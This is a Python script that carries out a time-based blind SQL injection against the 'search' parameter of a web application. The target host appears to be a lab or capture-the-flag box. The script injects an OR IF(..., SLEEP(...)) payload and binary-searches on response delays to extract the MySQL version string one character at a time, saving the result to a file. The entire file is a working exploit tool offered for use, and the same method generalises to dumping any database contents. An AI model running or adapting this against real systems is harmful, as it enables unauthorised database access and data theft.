#!/usr/bin/env python3
"""
extract_version.py
Time-based blind SQLi extractor for MySQL version() using the working "OR" payload style:
    ?search=' OR IF(<condition>, SLEEP(SLEEP_TIME), 0)-- -

Writes found version to extracted_version.txt
"""

import requests, time, sys

# ----- CONFIG -----
BASE_URL = "http://englishdictionary.hv/"   # keep trailing slash
PARAM = "search"
SLEEP_TIME = 6
TIMEOUT = SLEEP_TIME + 4
THRESH = SLEEP_TIME - 1.5
MAX_LEN = 120        # maximum expected length of version()
DELAY = 0.12
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
    "Connection": "keep-alive",
}
PROXIES = None   # e.g. {'http':'http://127.0.0.1:8080'} to route through Burp
# ----- END CONFIG -----

session = requests.Session()
session.headers.update(HEADERS)
if PROXIES:
    session.proxies.update(PROXIES)

def send_cond(cond):
    payload = f"' OR IF({cond}, SLEEP({SLEEP_TIME}), 0)-- -"
    try:
        t0 = time.time()
        r = session.get(BASE_URL, params={PARAM: payload}, timeout=TIMEOUT)
        elapsed = time.time() - t0
        return elapsed, r
    except requests.exceptions.ReadTimeout:
        return TIMEOUT, None
    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}", file=sys.stderr)
        return 0.0, None

def cond_true(cond):
    elapsed, _ = send_cond(cond)
    return elapsed > THRESH

def find_length(max_len=MAX_LEN):
    print("[*] Finding LENGTH(version()) via binary search")
    lo, hi = 0, max_len
    while lo < hi:
        mid = (lo + hi) // 2
        cond = f"LENGTH(version()) > {mid}"
        ok = cond_true(cond)
        print(f"  test LENGTH > {mid:3d} -> {'TRUE' if ok else 'FALSE'}")
        if ok:
            lo = mid + 1
        else:
            hi = mid
        time.sleep(DELAY)
    print(f"[+] LENGTH(version()) = {lo}")
    return lo

def extract_value(length):
    print(f"[*] Extracting version() ({length} chars)")
    out = ""
    for pos in range(1, length + 1):
        lo, hi = 32, 126
        found = None
        while lo <= hi:
            mid = (lo + hi) // 2
            cond = f"ASCII(SUBSTRING(version(),{pos},1)) > {mid}"
            if cond_true(cond):
                lo = mid + 1
            else:
                eq = f"ASCII(SUBSTRING(version(),{pos},1)) = {mid}"
                if cond_true(eq):
                    found = mid
                    out += chr(mid)
                    print(f"  pos {pos}: found '{chr(mid)}' (ASCII {mid})")
                    break
                else:
                    hi = mid - 1
            time.sleep(DELAY)
        if found is None:
            out += "?"
            print(f"  pos {pos}: unknown -> '?'")
    return out

def main():
    print("[*] baseline test (1=1)")
    base_ok = cond_true("1=1")
    elapsed, _ = send_cond("1=1")
    print(f"  baseline elapsed {elapsed:.2f}s -> {'TRUE' if base_ok else 'FALSE'}")
    if not base_ok:
        print("[!] Baseline failed. Check payload form or increase SLEEP_TIME.")
        return

    length = find_length()
    if length == 0:
        print("[!] LENGTH = 0. Try increasing MAX_LEN or run manual checks.")
        return

    version = extract_value(length)
    print("\n[RESULT] version() = " + version)
    with open("extracted_version.txt", "w") as f:
        f.write(version)
    print("[*] Saved to extracted_version.txt")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
